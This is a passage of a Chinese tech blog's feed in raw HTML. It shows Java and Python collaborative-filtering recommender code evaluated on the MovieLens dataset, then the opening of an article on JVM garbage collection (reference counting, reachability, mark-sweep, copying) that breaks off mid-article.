class="line">&#125;</span><br><span class="line">System.out.println(itemUserCollection.toString());</span><br><span class="line"><span class="comment">//计算相似度矩阵【稀疏】 </span></span><br><span class="line">Set&lt;Entry&lt;String, Set&lt;String&gt;&gt;&gt; entrySet = itemUserCollection.entrySet();</span><br><span class="line">Iterator&lt;Entry&lt;String, Set&lt;String&gt;&gt;&gt; iterator = entrySet.iterator();</span><br><span class="line"><span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">Set&lt;String&gt; commonUsers = iterator.next().getValue();</span><br><span class="line"><span class="keyword">for</span> (String user_u : commonUsers) &#123;</span><br><span class="line"><span class="keyword">for</span> (String user_v : commonUsers) &#123;</span><br><span class="line"><span class="keyword">if</span>(user_u.equals(user_v))&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">sparseMatrix[userID.get(user_u)][userID.get(user_v)] += <span class="number">1</span>;</span><br><span class="line"><span class="comment">//计算用户u与用户v都有正反馈的物品总数</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(userItemLength.toString());</span><br><span class="line">System.out.println(<span class="string">"Input the user for recommendation:&lt;eg:A&gt;"</span>);</span><br><span class="line">String recommendUser = scanner.nextLine();</span><br><span class="line">System.out.println(userID.get(recommendUser));</span><br><span class="line"><span class="comment">//计算用户之间的相似度【余弦相似性】 </span></span><br><span class="line"><span class="keyword">int</span> recommendUserId = userID.get(recommendUser);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; sparseMatrix.length; j++) &#123;</span><br><span class="line"><span class="keyword">if</span>(j != recommendUserId)&#123;</span><br><span class="line">System.out.println(idUser.get(recommendUserId)+<span class="string">"--"</span>+idUser.get(j)+<span class="string">"相似度:"</span>+sparseMatrix[recommendUserId][j]/Math.sqrt(userItemLength.get(idUser.get(recommendUserId))*userItemLength.get(idUser.get(j))));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计算指定用户recommendUser的物品推荐度 </span></span><br><span class="line"><span class="keyword">for</span> (String item: items)&#123;</span><br><span class="line"><span class="comment">//遍历每一件物品 </span></span><br><span class="line">Set&lt;String&gt; users = itemUserCollection.get(item);</span><br><span class="line"><span class="comment">//得到购买当前物品的所有用户集合 </span></span><br><span class="line"><span class="keyword">if</span>(!users.contains(recommendUser))&#123;</span><br><span class="line"><span class="comment">//如果被推荐用户没有购买当前物品，则进行推荐度计算 </span></span><br><span class="line"><span class="keyword">double</span> itemRecommendDegree = <span class="number">0.0</span>;</span><br><span class="line"><span class="keyword">for</span> (String user: users)&#123;</span><br><span class="line">itemRecommendDegree += sparseMatrix[userID.get(recommendUser)][userID.get(user)]/Math.sqrt(userItemLength.get(recommendUser)*userItemLength.get(user));</span><br><span class="line"><span class="comment">//推荐度计算</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"The item "</span>+item+<span class="string">" for "</span>+recommendUser +<span class="string">"'s recommended degree:"</span>+itemRecommendDegree);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">scanner.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>基于项目的CF：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span>  itemgetter</span><br><span class="line">random.seed(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ItemBasedCF</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.trainset = &#123;&#125;</span><br><span class="line">        self.testset = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        self.n_sim_movie = <span class="number">20</span></span><br><span class="line">        self.n_rec_movie = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">        self.movie_sim_mat = &#123;&#125;</span><br><span class="line">        self.movie_popular = &#123;&#125;</span><br><span class="line">        self.movie_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">'Similar movie number = %d'</span> % self.n_sim_movie, file = sys.stderr)</span><br><span class="line">        print(<span class="string">'Recommendend movie number = %d'</span> % self.n_rec_movie,file = sys.stderr)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loadfile</span><span class="params">(filename)</span>:</span></span><br><span class="line">        fp = open(filename, <span class="string">'r'</span>)</span><br><span class="line">        <span class="keyword">for</span> i, line <span class="keyword">in</span> enumerate(fp):</span><br><span class="line">            <span class="keyword">yield</span> line.strip(<span class="string">'\r\n'</span>)</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">100000</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'load %s(%s)'</span> %(filename,i), file = sys.stderr)</span><br><span class="line">        fp.close()</span><br><span class="line">        print(<span class="string">'load %s succ'</span> %filename, file = sys.stderr)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_dataset</span><span class="params">(self, filename, pivot = <span class="number">0.7</span>)</span>:</span></span><br><span class="line">        trainset_len = <span class="number">0</span></span><br><span class="line">        testset_len = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> self.loadfile(filename):</span><br><span class="line">            user, movie, rating , _= line.split(<span class="string">'::'</span>)</span><br><span class="line">            <span class="keyword">if</span> random.random() &lt; pivot:</span><br><span class="line">                self.trainset.setdefault(user,&#123;&#125;)</span><br><span class="line">                self.trainset[user][movie] = int(rating)</span><br><span class="line">                trainset_len += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.testset.setdefault(user,&#123;&#125;)</span><br><span class="line">                self.testset[user][movie] = int(rating)</span><br><span class="line">                testset_len += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">'split succ , trainset is %d , testset is %d'</span>  %(trainset_len,testset_len) , file = sys.stderr)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc_movie_sim</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> user, movies <span class="keyword">in</span> self.trainset.items():</span><br><span class="line">            <span class="keyword">for</span> movie <span class="keyword">in</span> movies:</span><br><span class="line">                <span class="keyword">if</span> movie <span class="keyword">not</span> <span class="keyword">in</span> self.movie_popular:</span><br><span class="line">                    self.movie_popular[movie] = <span class="number">0</span></span><br><span class="line">                self.movie_popular[movie] += <span class="number">1</span></span><br><span class="line">        print(<span class="string">'count movies number and pipularity succ'</span>,file = sys.stderr)</span><br><span class="line"></span><br><span class="line">        self.movie_count = len(self.movie_popular)</span><br><span class="line">        print(<span class="string">'total movie number = %d'</span> %self.movie_count, file = sys.stderr)</span><br><span class="line"></span><br><span class="line">        itemsim_mat = self.movie_sim_mat</span><br><span class="line">        print(<span class="string">'building co-rated users matrix'</span>, file = sys.stderr)</span><br><span class="line">        <span class="keyword">for</span> user, movies <span class="keyword">in</span> self.trainset.items():</span><br><span class="line">            <span class="keyword">for</span> m1 <span class="keyword">in</span> movies:</span><br><span class="line">                <span class="keyword">for</span> m2 <span class="keyword">in</span> movies:</span><br><span class="line">                    <span class="keyword">if</span> m1 == m2:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    itemsim_mat.setdefault(m1,&#123;&#125;)</span><br><span class="line">                    itemsim_mat[m1].setdefault(m2,<span class="number">0</span>)</span><br><span class="line">                    itemsim_mat[m1][m2] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">'build co-rated users matrix succ'</span>, file = sys.stderr)</span><br><span class="line">        print(<span class="string">'calculating movie similarity matrix'</span>, file = sys.stderr)</span><br><span class="line"></span><br><span class="line">        simfactor_count = <span class="number">0</span></span><br><span class="line">        PRINT_STEP = <span class="number">2000000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> m1, related_movies <span class="keyword">in</span> itemsim_mat.items():</span><br><span class="line">            <span class="keyword">for</span> m2, count <span class="keyword">in</span> related_movies.items():</span><br><span class="line">                itemsim_mat[m1][m2] = count / math.sqrt(self.movie_popular[m1] * self.movie_popular[m2])</span><br><span class="line">                simfactor_count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> simfactor_count % PRINT_STEP == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">'calcu movie similarity factor(%d)'</span> %simfactor_count, file = sys.stderr)</span><br><span class="line">        print(<span class="string">'calcu similiarity succ'</span>, file = sys.stderr)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recommend</span><span class="params">(self,user)</span>:</span></span><br><span class="line">        K = self.n_sim_movie</span><br><span class="line">        N = self.n_rec_movie</span><br><span class="line">        rank = &#123;&#125;</span><br><span class="line">        watched_movies = self.trainset[user]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> movie, rating <span class="keyword">in</span> watched_movies.items():</span><br><span class="line">            <span class="keyword">for</span> related_movie, similarity_factor <span class="keyword">in</span> sorted(self.movie_sim_mat[movie].items(), key=itemgetter(<span class="number">1</span>),</span><br><span class="line">                                                           reverse=<span class="keyword">True</span>)[<span class="number">0</span>:K]:</span><br><span class="line">                <span class="keyword">if</span> related_movie <span class="keyword">in</span> watched_movies:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                rank.setdefault(related_movie, <span class="number">0</span>)</span><br><span class="line">                rank[related_movie] += similarity_factor * rating</span><br><span class="line">        <span class="keyword">return</span> sorted(rank.items(), key=itemgetter(<span class="number">1</span>), reverse=<span class="keyword">True</span>)[<span class="number">0</span>:N]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">evaluate</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'evaluation start'</span>, file = sys.stderr)</span><br><span class="line"></span><br><span class="line">        N = self.n_rec_movie</span><br><span class="line"></span><br><span class="line">        hit = <span class="number">0</span></span><br><span class="line">        rec_count = <span class="number">0</span></span><br><span class="line">        test_count = <span class="number">0</span></span><br><span class="line">        all_rec_movies = set()</span><br><span class="line">        popular_sum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i, user <span class="keyword">in</span> enumerate(self.trainset):</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">500</span> == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">'recommend for %d users '</span> %i , file = sys.stderr)</span><br><span class="line">            test_movies = self.testset.get(user,&#123;&#125;)</span><br><span class="line">            rec_movies = self.recommend(user)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> movie, _ <span class="keyword">in</span> rec_movies:</span><br><span class="line">                <span class="keyword">if</span> movie <span class="keyword">in</span> test_movies:</span><br><span class="line">                    hit += <span class="number">1</span></span><br><span class="line">                all_rec_movies.add(movie)</span><br><span class="line">                popular_sum += math.log(<span class="number">1</span> + self.movie_popular[movie])</span><br><span class="line"></span><br><span class="line">            rec_count += N</span><br><span class="line">            test_count += len(test_movies)</span><br><span class="line"></span><br><span class="line">            precision = hit / (<span class="number">1.0</span> * rec_count)</span><br><span class="line">            recall = hit / (<span class="number">1.0</span> * test_count)</span><br><span class="line">            coverage = len(all_rec_movies) / (<span class="number">1.0</span> * self.movie_count)</span><br><span class="line">            popularity = popular_sum / (<span class="number">1.0</span> * rec_count)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">'precision is %.4f\t recall is %.4f \t coverage is %.4f \t popularity is %.4f'</span></span><br><span class="line">                  %(precision,recall,coverage,popularity), file = sys.stderr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ratingfile = os.path.join(<span class="string">'ml-1m'</span>, <span class="string">'ratings.dat'</span>)</span><br><span class="line">    itemcf = ItemBasedCF()</span><br><span class="line">    itemcf.generate_dataset(ratingfile)</span><br><span class="line">    itemcf.calc_movie_sim()</span><br><span class="line">    itemcf.evaluate()</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/6f93935a/">http://home.meng.uno/articles/6f93935a/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      过去很长时间以及现今，电商都在蓬勃发展，支持电商越做越大的一个很重要的因素就是“商品推荐”。当我们打开天猫，我们发现不同的用户，一般而言，首页是不一样的，原因就是，它为不同的用户推荐了不同的商品。我们为什么要用某一个购物网站或者APP，我觉得很大程度上取决于其推荐的准确与否。本篇博客我将向大家介绍协同过滤在商品推荐上的应用。

关于推荐系统
根据推荐引擎的数据源不同，一般而言，推荐系统可以分为如下三类：

 * 基于人口统计学的推荐机制（Demographic-based Recommendation）：根据系统用户的基本信息发现用户的相关程度。



 * 基于内容的推荐机制（Content
    
    </summary>
    
      <category term="Data Mining" scheme="http://home.meng.uno/categories/Data-Mining/"/>
    
    
      <category term="社会网络" scheme="http://home.meng.uno/tags/%E7%A4%BE%E4%BC%9A%E7%BD%91%E7%BB%9C/"/>
    
      <category term="商品推荐" scheme="http://home.meng.uno/tags/%E5%95%86%E5%93%81%E6%8E%A8%E8%8D%90/"/>
    
      <category term="协同过滤" scheme="http://home.meng.uno/tags/%E5%8D%8F%E5%90%8C%E8%BF%87%E6%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>JVM的垃圾回收机制</title>
    <link href="http://home.meng.uno/articles/dde60b3a/"/>
    <id>http://home.meng.uno/articles/dde60b3a/</id>
    <published>2018-03-09T07:14:32.000Z</published>
    <updated>2020-12-02T01:50:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1>简介</h1><p>Java GC（Garbage Collection，垃圾收集，垃圾回收）机制，是Java与C++/C的主要区别之一，作为Java开发者，一般不需要专门编写内存回收和垃圾清理代码，对内存泄露和溢出的问题，也不需要像C程序员那样战战兢兢。这是因为在Java虚拟机中，存在自动内存管理和垃圾清扫机制。概括地说，该机制对JVM（Java Virtual Machine）中的内存进行标记，并确定哪些内存需要回收，根据一定的回收策略，自动的回收内存，永不停息（Nerver Stop）的保证JVM中的内存空间，防止出现内存泄露和溢出问题。</p><p>关于JVM，需要说明一下的是，目前使用最多的Sun公司的JDK中，自从1999年的JDK1.2开始直至现在仍在广泛使用的JDK6，其中默认的虚拟机都是HotSpot。2009年，Oracle收购Sun，加上之前收购的EBA公司，Oracle拥有3大虚拟机中的两个：JRockit和HotSpot，Oracle也表明了想要整合两大虚拟机的意图，但是目前在新发布的JDK7中，默认的虚拟机仍然是HotSpot，因此本文中默认介绍的虚拟机都是HotSpot，相关机制也主要是指HotSpot的GC机制。</p><p>学习Java GC机制，可以帮助我们在日常工作中排查各种内存溢出或泄露问题，解决性能瓶颈，达到更高的并发量，写出更高效的程序。</p><h1>解决哪些问题</h1><p>既然是要进行自动GC，那必然会有相应的策略，而这些策略解决了哪些问题呢，粗略的来说，主要有以下几点。</p><ul>  <li>哪些对象可以被回收。</li>  <li>何时回收这些对象。</li>  <li>采用什么样的方式回收。</li></ul><p>说到垃圾回收（Garbage Collection，GC），很多人就会自然而然地把它和Java联系起来。在Java中，程序员不需要去关心内存动态分配和垃圾回收的问题，这一切都交给了JVM来处理。</p><p>顾名思义，垃圾回收就是释放垃圾占用的空间，那么在Java中，什么样的对象会被认定为“垃圾”？那么当一些对象被确定为垃圾之后，采用什么样的策略来进行回收（释放空间）？在目前的商业虚拟机中，有哪些典型的垃圾收集器？</p><h2 id="如何确定某个对象是-垃圾-？">如何确定某个对象是“垃圾”？</h2><p>既然垃圾收集器的任务是回收垃圾对象所占的空间供新的对象使用，那么垃圾收集器如何确定某个对象是“垃圾”？即通过什么方法判断一个对象可以被回收了。</p><p>在java中是通过引用来和对象进行关联的，也就是说如果要操作对象，必须通过引用来进行。那么很显然一个简单的办法就是通过引用计数来判断一个对象是否可以被回收。不失一般性，如果一个对象没有任何引用与之关联，则说明该对象基本不太可能在其他地方被使用到，那么这个对象就成为可被回收的对象了。这种方式成为引用计数法。</p><p>这种方式的特点是实现简单，而且效率较高，但是它无法解决循环引用的问题，因此在Java中并没有采用这种方式（Python采用的是引用计数法）。看下面这段代码：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       MyObject object1 = <span class="keyword">new</span> MyObject();</span><br><span class="line">       MyObject object2 = <span class="keyword">new</span> MyObject();</span><br><span class="line">        </span><br><span class="line">       object1.object = object2;</span><br><span class="line">       object2.object = object1;</span><br><span class="line">        </span><br><span class="line">       object1 = <span class="keyword">null</span>;</span><br><span class="line">       object2 = <span class="keyword">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> Object object = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>最后面两句将object1和object2赋值为null，也就是说object1和object2指向的对象已经不可能再被访问，但是由于它们互相引用对方，导致它们的引用计数都不为0，那么垃圾收集器就永远不会回收它们。</p><p>为了解决这个问题，在Java中采取了 可达性分析法。该方法的基本思想是通过一系列的“GC Roots”对象作为起点进行搜索，如果在“GC Roots”和一个对象之间没有可达路径，则称该对象是不可达的，不过要注意的是被判定为不可达的对象不一定就会成为可回收对象。被判定为不可达的对象要成为可回收对象必须至少经历两次标记过程，如果在这两次标记过程中仍然没有逃脱成为可回收对象的可能性，则基本上就真的成为可回收对象了。</p><p>至于可达性分析法具体是如何操作的我暂时也没有看得很明白，如果有哪位朋友比较清楚的话请不吝指教。</p><p>下面来看个例子：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Object aobj = <span class="keyword">new</span> Object ( ) ;</span><br><span class="line">Object bobj = <span class="keyword">new</span> Object ( ) ;</span><br><span class="line">Object cobj = <span class="keyword">new</span> Object ( ) ;</span><br><span class="line">aobj = bobj;</span><br><span class="line">aobj = cobj;</span><br><span class="line">cobj = <span class="keyword">null</span>;</span><br><span class="line">aobj = <span class="keyword">null</span>;</span><br></pre>      </td>    </tr>  </table></figure><p>第几行有可能会使得某个对象成为可回收对象？第7行的代码会导致有对象会成为可回收对象。至于为什么留给读者自己思考。</p><p>再看一个例子：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">String str = <span class="keyword">new</span> String(<span class="string">"hello"</span>);</span><br><span class="line">SoftReference&lt;String&gt; sr = </span><br><span class="line"><span class="keyword">new</span> SoftReference&lt;String&gt;(<span class="keyword">new</span> String(<span class="string">"java"</span>));</span><br><span class="line">WeakReference&lt;String&gt; wr = </span><br><span class="line"><span class="keyword">new</span> WeakReference&lt;String&gt;(<span class="keyword">new</span> String(<span class="string">"world"</span>));</span><br></pre>      </td>    </tr>  </table></figure><p>这三句哪句会使得String对象成为可回收对象？第2句和第3句，第2句在内存不足的情况下会将String对象判定为可回收对象，第3句无论什么情况下String对象都会被判定为可回收对象。</p><p>最后总结一下平常遇到的比较常见的将对象判定为可回收对象的情况：</p><ul>  <li>显示地将某个引用赋值为null或者将已经指向某个对象的引用指向新的对象，比如下面的代码：</li></ul><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Object obj = <span class="keyword">new</span> Object();</span><br><span class="line">obj = <span class="keyword">null</span>;</span><br><span class="line">Object obj1 = <span class="keyword">new</span> Object();</span><br><span class="line">Object obj2 = <span class="keyword">new</span> Object();</span><br><span class="line">obj1 = obj2;</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>局部引用所指向的对象，比如下面这段代码：</li></ul><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line">       Object obj = <span class="keyword">new</span> Object();</span><br><span class="line">       System.out.println(obj.getClass());</span><br><span class="line">   &#125;   </span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>循环每执行完一次，生成的Object对象都会成为可回收的对象。</p><ul>  <li>只有弱引用与其关联的对象，比如：</li></ul><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">WeakReference&lt;String&gt; wr = <span class="keyword">new</span> WeakReference&lt;String&gt;(<span class="keyword">new</span> String(<span class="string">"world"</span>));</span><br></pre>      </td>    </tr>  </table></figure><h2 id="典型的垃圾收集算法">典型的垃圾收集算法</h2><p>在确定了哪些垃圾可以被回收后，垃圾收集器要做的事情就是开始进行垃圾回收，但是这里面涉及到一个问题是：如何高效地进行垃圾回收。由于Java虚拟机规范并没有对如何实现垃圾收集器做出明确的规定，因此各个厂商的虚拟机可以采用不同的方式来实现垃圾收集器，所以在此只讨论几种常见的垃圾收集算法的核心思想。</p><p>需要明确的一点是，这里谈到的垃圾回收算法针对的是JVM的堆内存，栈基本上不存在垃圾回收方面的困扰。</p><h3 id="mark-sweep-标记-清除-算法">Mark-Sweep（标记-清除）算法</h3><p>这是最基础的垃圾回收算法，之所以说它是最基础的是因为它最容易实现，思想也是最简单的。标记-清除算法分为两个阶段：标记阶段和清除阶段。标记阶段的任务是标记出所有需要被回收的对象，清除阶段就是回收被标记的对象所占用的空间。</p><p>标记—清除算法是最基础的收集算法，它分为“标记”和“清除”两个阶段：首先标记出所需回收的对象，在标记完成后统一回收掉所有被标记的对象，它的标记过程其实就是前面的根搜索算法中判定垃圾对象的标记过程。</p><p>最基础的收集算法是“标记-清除”（Mark-Sweep）算法，如同它的名字一样，算法分为“标记”和“清除”两个阶段。</p><p><img src="http://www.meng.uno/images/gc/3.png" alt=""></p><p><img src="http://www.meng.uno/images/gc/4.png" alt=""></p><p>标记-清除算法实现起来比较容易，但是有一个比较严重的问题就是容易产生内存碎片，碎片太多可能会导致后续过程中需要为大对象分配空间时无法找到足够的空间而提前触发新的一次垃圾收集动作。</p><p>该算法有如下缺点：</p><ul>  <li>标记和清除过程的效率都不高。</li>  <li>标记清除后会产生大量不连续的内存碎片，空间碎片太多可能会导致，当程序在以后的运行过程中需要分配较大对象时无法找到足够的连续内存而不得不触发另一次垃圾收集动作。</li></ul><p>我们在程序（程序也就是指我们运行在JVM上的JAVA程序）运行期间如果想进行垃圾回收，就必须让GC线程与程序当中的线程互相配合，才能在不影响程序运行的前提下，顺利的将垃圾进行回收。</p><p>为了达到这个目的，标记/清除算法就应运而生了。它的做法是当堆中的有效内存空间（available memory）被耗尽的时候，就会停止整个程序（也被成为stop the world），然后进行两项工作，第一项则是标记，第二项则是清除。</p><ul>  <li>标记：标记的过程其实就是，遍历所有的GC Roots，然后将所有GC Roots可达的对象标记为存活的对象。</li>  <li>清除：清除的过程将遍历堆中所有的对象，将没有标记的对象全部清除掉。</li></ul><p>就是当程序运行期间，若可以使用的内存被耗尽的时候，GC线程就会被触发并将程序暂停，随后将依旧存活的对象标记一遍，最终再将堆中所有没被标记的对象全部清除掉，接下来便让程序恢复运行。</p><h3 id="copying-复制-算法">Copying（复制）算法</h3><p>为了解决效率问题，一种称为“复制”（Copying）的收集算法出现了，它将可用内存按容量划分为大小相等的两块，每次只使用其中的一块。 当这一块的内存用完了，就将还存活着的对象复制到另外一块上面，然后再把已使用过的内存空间一次清理掉。 这样使得每次都是对整个半区进行内存回收，内存分配时也就不用考虑内存碎片等复杂情况，只要移动堆顶指针，按顺序分配内存即可，实现简单，运行高效。 只是这种算法的代价是将内存缩小为了原来的一半，未免太高了一点。</p><p>现在的商业虚拟机都采用这种收集算法来回收新生代，IBM公司的专门研究表明，新生代中的对象98%是“朝生夕死”的，所以并不需要按照1:1的比例来划分内存空间，而是将内存分为一块较大的Eden空间和两块较小的Survivor空间，每次使用Eden和其中一块Survivor[1]。当回收时，将Eden和Survivor中还存活着的对象一次性地复制到另外一块Survivor空间上，最后清理掉Eden和刚才用过的Survivor空间。 HotSpot虚拟机默认Eden和Survivor的大小比例是8:1，也就是每次新生代中可用内存空间为整个新生代容量的90%（80%+10%），只有10%的内存会被“浪费”。  当然，98%的对象可回收只是一般场景下的数据，我们没有办法保证每次回收都只有不多于10%的对象存活，当Survivor空间不够用时，需要依赖其他内存（这里指老年代）进行分配担保（Handle Promotion）。</p><p>内存的分配担保就好比我们去银行借款，如果我们信誉很好，在98%的情况下都能按时偿还，于是银行可能会默认我们下一次也能按时按量地偿还贷款，只需要有一个担保人能保证如果我不能还款时，可以从他的账户扣钱，那银行就认为没有风险了。 